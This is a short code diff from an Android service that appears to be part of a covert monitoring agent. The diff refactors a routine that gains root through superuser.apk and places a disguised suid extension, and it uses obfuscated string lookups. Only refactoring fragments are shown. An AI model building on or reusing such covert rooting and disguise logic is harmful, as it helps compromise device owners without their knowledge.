@@ -13,7 +13,6 @@ import java.io.OutputStreamWriter;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
-import java.util.ArrayList;
 import java.util.Arrays;
 
 import javax.crypto.Cipher;
@@ -43,7 +42,6 @@ import android.widget.Toast;
 import com.android.service.auto.Cfg;
 import com.android.service.capabilities.PackageInfo;
 import com.android.service.util.Check;
-import com.android.service.util.Execute;
 import com.android.service.util.Utils;
 
 /**
@@ -136,10 +134,10 @@ public class ServiceCore extends Service {
 			// Ask the user...
 			superapkRoot();
 
-			boolean isRoot = PackageInfo.checkRoot();
+			Status.self().setSu(PackageInfo.checkRoot());
 			
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onStart): isRoot = " + isRoot); //$NON-NLS-1$
+				Check.log(TAG + " (onStart): isRoot = " + Status.self().haveRoot()); //$NON-NLS-1$
 			}
 		}
 		
@@ -427,14 +425,13 @@ public class ServiceCore extends Service {
 	}
 
 	// Prendi la root tramite superuser.apk
-	private boolean superapkRoot() {
+	private void superapkRoot() {
 		final File filesPath = getApplicationContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 		final String suidext = Messages.getString("32.6"); // statusdb
-		boolean isRoot = PackageInfo.checkRoot();
 
 		if (Status.self().haveSu() == false) {
-			return false;
+			return;
 		}
 		
 		Resources resources = getResources();
@@ -469,10 +466,8 @@ public class ServiceCore extends Service {
 				Check.log(TAG + " (superapkRoot): Exception"); //$NON-NLS-1$
 			}
 
-			return false;
+			return;
 		}
-
-		return isRoot;
 	}
 
 	private boolean root() {
